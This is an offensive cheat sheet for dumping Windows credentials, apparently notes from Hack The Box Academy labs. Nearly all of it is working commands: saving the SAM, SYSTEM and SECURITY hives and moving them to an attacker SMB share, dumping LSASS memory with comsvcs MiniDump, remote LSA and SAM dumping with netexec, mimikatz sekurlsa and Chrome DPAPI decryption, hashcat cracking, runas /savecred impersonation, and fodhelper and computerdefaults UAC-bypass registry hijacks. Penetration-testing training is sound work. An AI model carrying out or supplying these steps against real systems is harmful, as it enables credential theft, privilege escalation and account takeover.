# Windows Credential Dumping

## Registry Hives

Back up the registry hives as local admin, security hive can contain cached domain creds and other valuable data.

### Copy target hive

````powershell
# Make a copy of the hives
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

# Mount local share on attack box
sudo smbserver.py -smb2support CompData /home/ltnbob/Documents/

# Copy the hives
C:\> move sam.save \\10.10.15.16\CompData
C:\> move security.save \\10.10.15.16\CompData
C:\> move system.save \\10.10.15.16\CompData
````

### Dumping hashes with secretsdump.py

secretsdump.py will extract the system bootkey needed to dump the local SAM hashes.

`````bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Dumping local SAM hashes (uid:rid:lmhash:nthash)
`````

### Cracking hashes with Hashcat

- Populate retrieved hashes into > hashestocrack.txt
- For LM '-m' code see [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes)

#### Running Hashcat against NT hashes

```bash
# Craacking NT hashes
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

#### DCC2 hashes

These are local, hashed copies of network credential hashes.

```bash
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```

### DPAPI - Data Protection Application Programming Interface

```powershell
C:\Users\Public> mimikatz.exe

mimikatz: dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

### Remote dumping & LSA secrets

With local admin privlages

```bash
# Dumping LSA secrets remotely
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

# Dumping SAM Remotely
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

---

## LSASS - Local Security Authority Subsystem Service

LSASS stores credentials that have ***active logon*** sessions on Windows systems.

### Dumping LSASS process memory

There is a GUI method for dumping the Local Security Authority Process with Task Manager.

Determine what process ID (`PID`) is assigned to `lsass.exe`. 

```powershell
# cmd.exe
C:\Windows\system32> tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc

# PowerShell
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass

# Create a dump file using PowerShell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Copy the dump over using [this method](#copy-target-hive)

### [Pypykatz](https://github.com/skelsec/pypykatz) to extract credentials

> Mimikatz implementation in pure Python 

```bash
# Extract hashes
pypykatz lsa minidump /home/peter/Documents/lsass.dmp

# Crack NT hashes found
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Windows Vault and Credential Manager

### Enumerating credentials with cmdkey

```cmd
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```

Look for 'interactive=' and execute runas to impersonate the user:

```cmd
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```

### Extracting credentials with [Mimikatz](https://github.com/ParrotSec/mimikatz)

Dump credentials from memory using the `sekurlsa` module, or manually decrypt credentials using the `dpapi` module.

May need to bypass UAC if no admin rights, impersonation does not grant admin permissions.

```cmd
# Target the LSASS process with sekurlsa:
C:\Users\Administrator\Desktop> mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

# Credential Manager
mimikatz # sekurlsa::credman

# Local passwords and hashes
mimikatz # sekurlsa::logonpasswords
```

Methods for getting passed UAC if no admin access:

```cmd
# fodhelper.exe
reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

# computerdefaults.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```
